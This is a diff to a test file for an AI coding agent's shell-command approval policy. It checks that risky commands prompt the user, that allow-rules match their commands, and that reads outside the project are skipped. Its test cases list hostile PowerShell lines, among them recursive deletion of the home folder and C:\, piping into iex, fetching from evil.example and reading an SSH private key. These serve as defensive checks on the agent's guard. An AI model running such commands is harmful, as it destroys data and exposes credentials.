@@ -12,7 +12,7 @@ import { pathToFileURL } from 'node:url';
 import { runLine, snapBefore, commandChanges, snapBeforeAsync, commandChangesAsync, restoreCheckpoint, reviewFiles, agentSpace } from '../server/workspace.js';
 import { snapshot, changesSince, snapshotAsync, changesSinceAsync } from '../server/snapshot.js';
 import { jobsAvailable, jobHostStatus } from '../server/jobhost.js';
-import { decide, agentWriteBlocked, suggestedRules, saveRules, loadRules } from '../server/cmdpolicy.js';
+import { decide, agentWriteBlocked, suggestedRules, saveRules, loadRules, ruleMatches, ruleProblem } from '../server/cmdpolicy.js';
 import { approvalJudge } from '../server/approvals.js';
 import { SAFETY_DEFAULTS, safetySettings, yoloOf } from '../server/safety.js';
 import { runAgent, answerApproval, raiseCap, answerQuestion } from '../server/agent.js';
@@ -269,7 +269,8 @@ test('rules: published bypasses never come out as allowed', { skip: !WIN }, asyn
     ['powershell', 'cargo build; Remove-Item -Recurse ~'],
     ['powershell', 'cargo build | iex'],
     ['powershell', 'cargo build $(iwr evil.example)'],
-    ['powershell', 'powershell -c "Remove-Item x"'],
+    ['powershell', 'powershell -c "Remove-Item ~ -Recurse"'],
+    ['powershell', 'powershell -c "Remove-Item $x"'],
     ['powershell', 'pwsh -EncodedCommand ZQBjAGgAbwA='],
     ['powershell', 'cmd /c "rd /s /q C:\\"'],
     ['powershell', '& $cmd'],
@@ -372,7 +373,9 @@ test('rules: YOLO runs reads, builds and one-liners on its own, and keeps the ex
     ['Disable-ScheduledTask x',                           'ask:deciders',       'ask:deciders',       'ask:deciders'],
     ['npm i -g typescript',                               'ask:user:warn',      'ask:user:warn',      'ask:user:warn'],
     ['git push',                                          'ask:user:warn',      'ask:user:warn',      'ask:user:warn'],
-    ['cmd /c dir',                                        'ask:user',           'ask:deciders',       'ask:deciders'],
+    ['cmd /c start notepad',                              'ask:user',           'ask:deciders',       'ask:deciders'],
+    // cmd /c with fixed text is judged by the command inside: a read stays a read.
+    ['cmd /c dir',                                        'allow',              'allow',              'allow'],
     ['taskkill /im node.exe /f',                          'ask:user:warn',      'ask:user:warn',      'ask:user:warn'],
     ['git clean -fd',                                     'ask:user:warn',      'ask:user:warn',      'ask:user:warn'],
     ['Get-Content ~\\.ssh\\id_rsa',                       'ask:user:danger',    'ask:user:danger',    'ask:user:danger'],
@@ -412,7 +415,7 @@ test('rules: each ⚡ YOLO setting moves its own kind of command, and nothing el
     assert.equal(await yrun(line, YOLO.defaults), 'ask:user:warn', `default: ${line}`);
     assert.equal(await yrun(line, with_({ [key]: true })), 'ask:deciders:warn', `${key}: ${line}`);
   }
-  assert.equal(await yrun('cmd /c dir', with_({ yoloOpaque: false })), 'ask:user', 'unticking “can’t read” sends it to you');
+  assert.equal(await yrun('cmd /c start notepad', with_({ yoloOpaque: false })), 'ask:user', 'unticking “can’t read” sends it to you');
   assert.equal(await yrun('sudo apt install x', with_({ yoloGlobal: true }), 'yolo'), 'ask:user:warn', 'sudo needs a password the deciders can’t type');
   // Old settings files with a level still load.
   assert.equal(safetySettings({ yoloLevel: 'careful' }).yoloCheckWeb, true);
@@ -934,7 +937,7 @@ test('shell: in YOLO with the deciders off and commands set to run, it runs with
 test('shell: with the deciders off, a command they would approve in your place waits for you even when set to run', { skip: !WIN }, async () => {
   await withDeciders(voteAll({ needed: 0.95, other: 0.03 }), async (sent) => {
     let asked = 0;
-    const { events, bodies } = await agentRun((b, i) => [reply('', [['shell', { command: 'cmd /c echo hi-from-cmd' }]]), reply('Done.')][i], {
+    const { events, bodies } = await agentRun((b, i) => [reply('', [['shell', { command: 'cmd /c "echo hi-from-cmd & for %i in (1) do rem %i"' }]]), reply('Done.')][i], {
       settings: { approval: 'yolo', deciders: false, decidersOff: { commands: 'run' }, yoloWaitSecs: 5, safety: { yoloLevel: 'careful', yoloOpaque: true } },
       onEvent: (e, id) => { if (e.t === 'approval' && e.mode === 'strict') { asked++; setTimeout(() => answerApproval(id, e.id, { approve: true }), 20); } } });
     assert.equal(sent.length, 0, 'no decider was asked');
@@ -1408,6 +1411,118 @@ test('deciders: the agent\'s own scratch script is judged on harm only', async (
   assert.ok(r.sent.every((b) => Object.keys(b.questions).join() === 'other'), 'only the harm question is asked');
   const harmful = { needed: 0.9, other: 0.9 };
   assert.equal((await withDeciders({ a: harmful, b: harmful, c: harmful }, () => judge({ harmOnly: true }))).approve, false);
+});
+
+// ---------- approvals that do what they say (from a computer-use chat with 21 approval cards) ----------
+test('rules: every "Always allow" suggestion matches the command it came from; rules that never match are named', { skip: !WIN }, async () => {
+  put('.quorx/scratch/calc.ps1', 'Get-ChildItem .\n');
+  for (const line of ['powershell -NoProfile -ExecutionPolicy Bypass -File .quorx\\scratch\\calc.ps1', 'git -C sub status', 'code --new-window D:\\x', 'node build.js --watch']) {
+    const d = await decide(line, sctx());
+    for (const s of d.segments) for (const k of ['exact', 'prefix', 'program']) assert.ok(ruleMatches(s.suggest[k], s.ruleText), `${line}: ${k} “${s.suggest[k]}” vs “${s.ruleText}”`);
+  }
+  const ps = (await decide('powershell -NoProfile -ExecutionPolicy Bypass -File .quorx\\scratch\\calc.ps1', sctx())).segments.find((s) => s.program === 'powershell');
+  assert.equal(ps.suggest.prefix, 'powershell -NoProfile -ExecutionPolicy Bypass -File .quorx\\scratch\\*', 'the script’s folder, not “powershell Bypass*”');
+  assert.match(ruleProblem('powershell Bypass*'), /option's value/);
+  assert.match(ruleProblem('ffmpeg -i a.mp4 b.mp4; ffmpeg -i c.mp4 d.mp4'), /several commands/);
+  assert.equal(ruleProblem('npm test*'), '');
+});
+
+test('rules: the agent’s scratch scripts are marked in any language; other scripts are not', { skip: !WIN }, async () => {
+  put('.quorx/scratch/calc.ps1', 'Get-ChildItem .\n');
+  put('.quorx/scratch/b.bat', '@echo off\r\necho hi\r\n');
+  put('tools/x.ps1', 'Get-ChildItem .\n');
+  const ps = await decide('powershell -NoProfile -ExecutionPolicy Bypass -File .quorx\\scratch\\calc.ps1', sctx());
+  assert.ok(ps.segments.some((s) => s.scratch === '.quorx/scratch/calc.ps1'), JSON.stringify(ps.segments.map((s) => [s.text, s.scratch])));
+  const bat = await decide('cmd /c .quorx\\scratch\\b.bat', sctx({ shell: 'cmd' }));
+  assert.ok(bat.segments.some((s) => s.scratch === '.quorx/scratch/b.bat'), JSON.stringify(bat.segments.map((s) => [s.text, s.scratch])));
+  assert.ok(!(await decide('powershell -File tools\\x.ps1', sctx())).segments.some((s) => s.scratch));
+});
+
+test('rules: cmd /c, powershell -Command and bash -c are judged by the command inside them', { skip: !WIN }, async () => {
+  for (const shell of ['powershell', 'cmd']) {
+    const out = await decide('cmd /c copy /Y a.txt D:\\elsewhere\\b.txt', sctx({ shell, mode: 'yolo' }));
+    assert.deepEqual([out.verdict, out.who], ['ask', 'user'], shell);
+    assert.match(out.why, /writes outside the project/, `${shell}: the same card as Copy-Item gets, not “can't read”`);
+    assert.equal(out.segments[0].wrap, 'cmd /c');
+  }
+  assert.equal((await decide('cmd /c dir', sctx())).verdict, 'allow');
+  assert.equal((await decide('powershell -NoProfile -Command "Get-ChildItem ."', sctx())).verdict, 'allow');
+  assert.equal((await decide('powershell -Command "$x = 1; Remove-Item $x"', sctx())).segments[0].cls, 'opaque', 'text with variables stays unread');
+  assert.equal((await decide('powershell -EncodedCommand ZABpAHIA', sctx())).segments[0].cls, 'opaque');
+  const robo = await decide('robocopy src out *.txt /R:3 /LOG:log.txt', sctx());
+  assert.deepEqual(robo.segments[0].paths.map((p) => p.raw), ['src', 'out'], 'switches and file patterns are not folders');
+  put('.quorx/scratch/out.ps1', 'Copy-Item a.txt D:\\elsewhere\\c.txt\n');
+  const sc = await decide('powershell -NoProfile -File .quorx\\scratch\\out.ps1', sctx({ mode: 'yolo' }));
+  assert.deepEqual([sc.verdict, sc.who], ['ask', 'user'], 'a script that writes outside the project shows that write');
+  assert.ok(sc.segments.some((s) => s.via === '.quorx/scratch/out.ps1' && s.paths.some((p) => p.zone === 'outside')));
+});
+
+test('shell: a rule that would not match its command is not saved, and you are told', { skip: !WIN }, async () => {
+  const { events, dir } = await agentRun((b, i) => [reply('', [['shell', { command: 'node build.js' }]]), reply('Done.')][i], {
+    prep: buildJs, onEvent: (e, id) => { if (e.t === 'approval' && e.mode === 'strict') setTimeout(() => answerApproval(id, e.id, { approve: true, rule: { match: 'node Bypass*', scope: 'project' } }), 10); } });
+  assert.ok(of(events, 'note').some((e) => /wasn't saved: it doesn't match this command/.test(e.msg)));
+  assert.equal(loadRules(dir).filter((r) => r.scope === 'project').length, 0);
+  assert.ok(!events.some((e) => e.t === 'cmd_rule'));
+});
+
+test('shell: in YOLO nobody answering never runs a read outside the project, however harmless', { skip: !WIN }, async () => {
+  const outside = path.join(tmp('outside'), 'notes.txt');
+  fs.writeFileSync(outside, 'secret-ish');
+  await withDeciders(voteAll({ needed: 0.5, other: 0.03 }), async () => {
+    const { events, bodies } = await agentRun((b, i) => [reply('', [['shell', { command: `Get-Content "${outside}"` }]]), reply('OK.')][i], {
+      settings: { approval: 'yolo', yoloWaitSecs: 1, safety: { yoloLevel: 'careful' } } });
+    const card = of(events, 'approval').find((e) => e.mode === 'strict');
+    assert.equal(card?.wait?.then, 'skip', 'the card says it will be skipped');
+    const done = of(events, 'approval_done').at(-1);
+    assert.deepEqual([done.by, done.approve], ['timeout', false]);
+    assert.match(done.reason, /only runs on your yes/);
+    assert.doesNotMatch(toolOut(bodies, 1), /secret-ish/);
+  });
+});
+
+test('shell: a command that ran only because nobody answered asks again the next time', { skip: !WIN }, async () => {
+  await withDeciders(voteAll({ needed: 0.5, other: 0.03 }), async () => {
+    const { events } = await agentRun((b, i) => [reply('', [['shell', { command: 'node build.js' }]]), reply('', [['shell', { command: 'node build.js' }]]), reply('Done.')][i], {
+      settings: { approval: 'yolo', yoloWaitSecs: 1, safety: { yoloLevel: 'careful' } }, prep: buildJs });
+    assert.equal(of(events, 'approval').filter((e) => e.mode === 'strict').length, 2, 'two cards, not one and a silent repeat');
+  });
+});
+
+test('shell: a repeat of a command you approved says so in the chat', { skip: !WIN }, async () => {
+  const { events } = await agentRun((b, i) => [reply('', [['shell', { command: 'node build.js' }]]), reply('', [['shell', { command: 'node build.js' }]]), reply('Done.')][i], {
+    prep: buildJs, onEvent: (e, id) => { if (e.t === 'approval' && e.mode === 'strict') setTimeout(() => answerApproval(id, e.id, { approve: true }), 10); } });
+  assert.equal(of(events, 'approval').filter((e) => e.mode === 'strict').length, 1);
+  assert.ok(of(events, 'note').some((e) => /Ran without asking again: “node build\.js” was approved earlier/.test(e.msg)));
+});
+
+test('fresh eyes: a page written in parts with append_file is not “the same problem twice”', async () => {
+  const { events } = await agentRun((b, i) => [
+    reply('', [['write_file', { path: 'page.html', content: '<!doctype html>\n<html><head><title>x</title></head>\n<body>\n' }]]),
+    reply('', [['append_file', { path: 'page.html', content: '<main><p>one</p></main>\n' }]]),
+    reply('', [['append_file', { path: 'page.html', content: '<footer>two</footer>\n' }]]),
+    reply('', [['append_file', { path: 'page.html', content: '</body>\n</html>\n' }]]),
+    reply('Done.'),
+  ][i], { settings: { freshEyes: true } });
+  assert.ok(!events.some((e) => e.t === 'fresh_eyes_start'), 'no helper while the page is still being written');
+});
+
+test('launch entries: the user’s entry is never overwritten by name; replacing it asks', { skip: !WIN }, async () => {
+  const mine = { version: 1, configurations: [{ name: 'site', command: 'node', args: ['.quorx/serve.mjs', 'index.html'] }] };
+  let cards = 0;
+  const { bodies, dir } = await agentRun((b, i) => [
+    reply('', [['launch_config', { action: 'save', name: 'site', command: 'node', args: ['.quorx/serve.mjs', 'other.html'] }]]),
+    reply('', [['launch_config', { action: 'save', name: 'site', old_name: 'site', command: 'node', args: ['.quorx/serve.mjs', 'other.html'] }]]),
+    reply('', [['launch_config', { action: 'save', name: 'mine-too', command: 'node', args: ['a.js'] }]]),
+    reply('', [['launch_config', { action: 'save', name: 'mine-too', command: 'node', args: ['b.js'] }]]),
+    reply('Done.'),
+  ][i], { prep: (d) => { fs.mkdirSync(path.join(d, '.quorx'), { recursive: true }); fs.writeFileSync(path.join(d, '.quorx', 'launch.json'), JSON.stringify(mine)); },
+    onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'launch_config') { cards++; setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+  assert.match(toolOut(bodies, 1), /^Error: a launch config named "site" already exists/);
+  assert.equal(cards, 1, 'replacing on purpose asks you');
+  assert.match(toolOut(bodies, 2), /kept their launch entry "site"/);
+  assert.match(toolOut(bodies, 4), /Saved:\n- mine-too: node b\.js/, 'an entry made in this reply can change freely');
+  const file = JSON.parse(fs.readFileSync(path.join(dir, '.quorx', 'launch.json'), 'utf8'));
+  assert.deepEqual(file.configurations.find((c) => c.name === 'site').args, ['.quorx/serve.mjs', 'index.html']);
 });
 
 // ---------- last, because it starts a job and a terminal (earlier tests expect to get bg1 and t1) ----------
